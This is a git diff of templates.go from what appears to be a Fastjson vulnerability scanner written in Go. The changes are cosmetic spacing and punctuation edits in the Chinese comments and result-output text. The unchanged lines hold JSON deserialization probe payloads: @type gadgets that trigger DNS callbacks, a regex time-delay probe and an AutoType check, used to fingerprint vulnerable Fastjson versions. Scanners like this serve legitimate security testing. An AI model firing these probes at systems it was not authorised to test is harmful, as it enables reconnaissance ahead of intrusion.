@@ -1,9 +1,7 @@
 package Utils
 
-
-
 /** templates.go
-*** payload模版 results模版
+*** payload 模版 results 模版
 **/
 
 /* 报错检测 */
@@ -18,12 +16,12 @@ var TAR_NET_DETECT = `{"name":{"@type":"java.net.Inet4Address","val":"{{.Variabl
 
 var TIME_DETECT = `{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaaaaaaaaaaa{{.Variables.Value}}!"}`
 
-/* AutoType检测 */
+/* AutoType 检测 */
 
 var AUTOTYPE_CHECK = `[{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"{{.Variables.DNS}}"}]`
 
 /************************************************
-***                  DNS检测                   ***
+***                  DNS 检测                   ***
 *************************************************/
 
 // fastjson < 1.2.48
@@ -35,7 +33,6 @@ var DNS_DETECT_48 = `
     {"@type":"java.net.InetSocketAddress"{"address":,"val":"48_.{{.Variables.DNS}}"}}
 ]
 `
-
 
 // 1.2.48 ≤ fastjson ≤ 1.2.68
 
@@ -91,13 +88,12 @@ var DEPENDENCY_DETECT_BY_ERR = `
 
 var RESULT_OUTPUT = `Scan Result
 Target: {{.Variables.Url}}
-[+] Fastjson 版本: {{.Variables.Version}}
-[+] 网络状态判断: {{.Variables.Netout}}
-[+] AutoType 状态: {{.Variables.Autotype}}
-[+] 依赖库信息:
-	{{range .Dependency}} 
+[+] Fastjson 版本：{{.Variables.Version}}
+[+] 网络状态判断：{{.Variables.Netout}}
+[+] AutoType 状态：{{.Variables.Autotype}}
+[+] 依赖库信息：
+	{{range .Dependency}}
 	{{.}}
 	{{end}}
-
 <---------------------------------------------->
 `
